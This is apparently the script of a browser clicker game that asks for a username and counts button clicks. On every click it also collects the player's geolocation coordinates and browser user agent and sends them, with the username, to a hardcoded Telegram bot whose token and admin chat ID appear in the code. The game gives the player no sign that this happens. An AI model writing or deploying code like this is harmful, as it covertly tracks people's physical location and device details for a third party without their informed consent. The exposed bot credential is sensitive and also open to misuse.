const botToken = '7807511656:AAGh33sQVmadKtdLpHN47RdOCZMI3G9msyg';
const adminChatId = '6450551010';

 let username = '';
 let points = 0;

 document.getElementById('leaderboard-icon').addEventListener('click', () => {
   window.location.href = 'leaderboard.html';
 });

 function promptUsername() {
   Swal.fire({
     title: 'Enter Your Username',
     input: 'text',
     inputPlaceholder: 'Username',
     allowOutsideClick: false,
     showCancelButton: false,
     confirmButtonText: 'Start Game',
     inputValidator: (value) => {
       if (!value) {
         return 'You need to enter a username!';
       }
     },
   }).then((result) => {
     if (result.isConfirmed) {
       username = result.value;
       sendToTelegram(adminChatId, `🎮 New player joined: ${username}`);
       document.getElementById('game-container').style.display = 'block';
     }
   });
 }

 document.addEventListener('DOMContentLoaded', promptUsername);

 const pointCounter = document.getElementById('point-counter');
 const clickButton = document.getElementById('click-button');

 clickButton.addEventListener('click', async () => {
   points += 1;
   pointCounter.textContent = points;

   const location = await getUserLocation();
   const deviceInfo = navigator.userAgent;

   const message = `🎮 ${username} just clicked!
- Points: ${points}
- Device: ${deviceInfo}
- Location: ${location || 'Unavailable'}`;

   sendToTelegram(adminChatId, message);
 });

 function sendToTelegram(chatId, message) {
   const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
   const data = {
     chat_id: chatId,
     text: message,
   };

   fetch(url, {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json',
     },
     body: JSON.stringify(data),
   })
     .then(response => console.log('Message sent to Telegram!'))
     .catch(error => console.error('Error sending message:', error));
 }

 function getUserLocation() {
   return new Promise((resolve, reject) => {
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
         (position) => {
           const { latitude, longitude } = position.coords;
           resolve(`Lat: ${latitude}, Long: ${longitude}`);
         },
         (error) => {
           resolve(null);
         }
       );
     } else {
       resolve(null);
     }
   });
 }